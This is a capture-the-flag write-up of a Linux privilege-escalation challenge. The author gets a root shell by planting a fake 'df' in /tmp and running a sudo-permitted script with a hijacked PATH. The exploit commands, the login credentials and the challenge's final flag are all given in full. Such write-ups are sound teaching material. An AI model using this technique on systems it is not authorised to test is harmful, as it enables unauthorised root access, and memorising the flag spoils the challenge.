Event: NCA CTF  
Category: #Pentest 

---

## üìå Challenge Information

- Points: 1000
    
- Difficulty: Very Easy
    
- Credentials (if provided):
    
    - Username: `ctfplayer`
        
    - Password: `ctfplayer`
        

---

## üìù Challenge Description

This challenge requires escalating privileges to root by exploiting a SUDO command with an environment variable trick. The user can run `/opt/script.sh` as root with `SETENV` permission, allowing for PATH manipulation. The goal is to get the root flag.

---

# üîé Initial Enumeration

### Step 1 ‚Äì Check SUDO Permissions

```bash
sudo -l
```

Output:

```
User ctfplayer may run the following commands on b9331e03e973:
    (ALL) SETENV: NOPASSWD: /opt/script.sh
```

### Step 2 ‚Äì Examine Script

```bash
cat /opt/script.sh
```

Observation: The script runs commands that can be hijacked via PATH manipulation.

### Step 3 ‚Äì Create Malicious Binary

```bash
cd /tmp
echo '/bin/bash' > df
chmod +x df
```

### Step 4 ‚Äì Trigger Script With Hijacked PATH

```bash
sudo PATH=/tmp:$PATH /opt/script.sh
```

### Step 5 ‚Äì Verify Root

```bash
whoami
```

Output:

```
root
```

---

## üëÄ Observations

- The user could run `/opt/script.sh` as root without a password.
    
- The script executed binaries from PATH without specifying full paths.
    
- This allowed overriding commands by creating a fake binary in `/tmp`.
    
- Running the script with the modified `PATH` escalated privileges to root.
    

---

# üöß Problem Identified

The challenge exploits a **PATH manipulation vulnerability**:

- SUDO allowed running a script with `SETENV` (environment variables can be modified).
    
- The script used commands without absolute paths, making it possible to hijack commands by placing a malicious executable earlier in `PATH`.
    

---

# üõ† Exploitation / Solution

## Method Used

- Created a fake binary `df` in `/tmp` that simply spawns `/bin/bash`.
    
- Prepend `/tmp` to `PATH` when running `/opt/script.sh` with `sudo`.
    
- When the script calls `df`, our fake binary executes instead, giving a root shell.
    

## Alternative Method (If Any)

- Could have created a different hijack binary if another command was used in the script.
    
- Alternatively, modifying other environment variables if `SETENV` allowed further control.
    

---

# üì§ Command Used to Retrieve the Flag

```bash
cat /root/flag.txt
```

Output:

```
NCA{Hmmmmm_Y0u_4r3_6r3a7_a7_H1j4ck1ng_7h47s_SUS_29aa768ac030}
```

---

# üö© Final Flag

`NCA{Hmmmmm_Y0u_4r3_6r3a7_a7_H1j4ck1ng_7h47s_SUS_29aa768ac030}`

---

# üß† Key Takeaways

- Always check SUDO permissions (`sudo -l`) for potential escalation vectors.
    
- Scripts run as root may be exploited if commands are called without full paths.
    
- PATH hijacking is a powerful privilege escalation technique.
    

---

# üìö Skills Practiced

- Linux Enumeration
    
- SUDO Permission Analysis
    
- PATH Hijacking
    
- Shell Scripting Exploitation
    
- Privilege Escalation
    

---

# üèÅ Personal Reflection

Next time, I would first check for `SETENV` SUDO permissions and immediately consider PATH hijacking before trying other methods. This approach is quick and reliable for scripts executed by root.
